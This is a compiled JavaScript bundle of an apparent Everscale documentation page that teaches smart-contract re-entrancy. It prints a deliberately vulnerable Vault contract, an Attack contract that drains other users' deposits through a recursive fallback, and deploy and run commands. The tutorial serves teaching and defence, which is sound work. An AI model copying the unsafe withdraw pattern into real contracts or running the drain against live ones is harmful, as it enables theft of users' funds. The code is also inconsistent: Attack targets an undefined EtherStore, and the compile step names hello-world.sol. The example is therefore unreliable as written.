"use strict";(self.webpackChunkeverscale_docs_website=self.webpackChunkeverscale_docs_website||[]).push([[1863],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>b});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function c(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},l=Object.keys(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var i=r.createContext({}),s=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):c(c({},t),e)),n},p=function(e){var t=s(e.components);return r.createElement(i.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,l=e.originalType,i=e.parentName,p=o(e,["components","mdxType","originalType","parentName"]),u=s(n),h=a,b=u["".concat(i,".").concat(h)]||u[h]||d[h]||l;return n?r.createElement(b,c(c({ref:t},p),{},{components:n})):r.createElement(b,c({ref:t},p))}));function b(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var l=n.length,c=new Array(l);c[0]=h;var o={};for(var i in t)hasOwnProperty.call(t,i)&&(o[i]=t[i]);o.originalType=e,o[u]="string"==typeof e?e:a,c[1]=o;for(var s=2;s<l;s++)c[s]=n[s];return r.createElement.apply(null,c)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},3803:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>c,default:()=>d,frontMatter:()=>l,metadata:()=>o,toc:()=>s});var r=n(7462),a=(n(7294),n(3905));const l={sidebar_position:1,title:"Re-Entrancy",description:"Reentracy exploit allows B to call back into A before A finishes execution"},c=void 0,o={unversionedId:"solidity-by-example/hack/re-entrancy",id:"solidity-by-example/hack/re-entrancy",title:"Re-Entrancy",description:"Reentracy exploit allows B to call back into A before A finishes execution",source:"@site/../../src/solidity-by-example/hack/re-entrancy.md",sourceDirName:"solidity-by-example/hack",slug:"/solidity-by-example/hack/re-entrancy",permalink:"/preview/PR-359/solidity-by-example/hack/re-entrancy",draft:!1,editUrl:"https://github.com/everscale-org/docs/edit/main/.build/website/../../src/solidity-by-example/hack/re-entrancy.md",tags:[],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,title:"Re-Entrancy",description:"Reentracy exploit allows B to call back into A before A finishes execution"},sidebar:"tutorialSidebar",previous:{title:"Simple wallet",permalink:"/preview/PR-359/solidity-by-example/application/simple-wallet"}},i={},s=[{value:"What happened?",id:"what-happened",level:2},{value:"Deploying the contract",id:"deploying-the-contract",level:2},{value:"Interacting with the contract",id:"interacting-with-the-contract",level:2}],p={toc:s},u="wrapper";function d(e){let{components:t,...n}=e;return(0,a.kt)(u,(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Vulnerability:")," Let's say that contract ",(0,a.kt)("inlineCode",{parentName:"p"},"A")," calls contract ",(0,a.kt)("inlineCode",{parentName:"p"},"B"),"."),(0,a.kt)("p",null,"Reentracy exploit allows B to call back into A before A finishes execution."),(0,a.kt)("p",null,"EtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Deploy EtherStore"),(0,a.kt)("li",{parentName:"ol"},"Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore"),(0,a.kt)("li",{parentName:"ol"},"Deploy Attack with address of EtherStore"),(0,a.kt)("li",{parentName:"ol"},"Call Attack.attack sending 1 ether (using Account 3 (Eve)).\nYou will get 3 Ethers back (2 Ether stolen from Alice and Bob,\nplus 1 Ether sent from this contract).")),(0,a.kt)("h2",{id:"what-happened"},"What happened?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma ever-solidity ^0.70.0;\n\ncontract Vault {\n    mapping(address => uint) public balances;\n\n    function deposit() public externalMsg {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint bal = balances[msg.sender];\n        require(bal > 0);\n\n        (bool sent, ) = msg.sender.call{value: bal}("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] = 0;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    EtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n')),(0,a.kt)("p",null,"Attack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing."),(0,a.kt)("p",null,"Here is how the functions were called"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Attack.attack"),(0,a.kt)("li",{parentName:"ul"},"EtherStore.deposit"),(0,a.kt)("li",{parentName:"ul"},"EtherStore.withdraw"),(0,a.kt)("li",{parentName:"ul"},"Attack fallback (receives 1 Ether)"),(0,a.kt)("li",{parentName:"ul"},"EtherStore.withdraw"),(0,a.kt)("li",{parentName:"ul"},"Attack.fallback (receives 1 Ether)"),(0,a.kt)("li",{parentName:"ul"},"EtherStore.withdraw"),(0,a.kt)("li",{parentName:"ul"},"Attack fallback (receives 1 Ether)")),(0,a.kt)("h2",{id:"deploying-the-contract"},"Deploying the contract"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-shell"},"npx everdev sol set --compiler 0.70.0\nnpx everdev sol compile hello-world.sol\nnpx everdev contract deploy Vault -v 10T\n")),(0,a.kt)("h2",{id:"interacting-with-the-contract"},"Interacting with the contract"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-shell"},"npx everdev contract run-local Vault balance\nnpx everdev contract run-local Attack balance\nnpx everdev contract run Attack attack\n")))}d.isMDXComponent=!0}}]);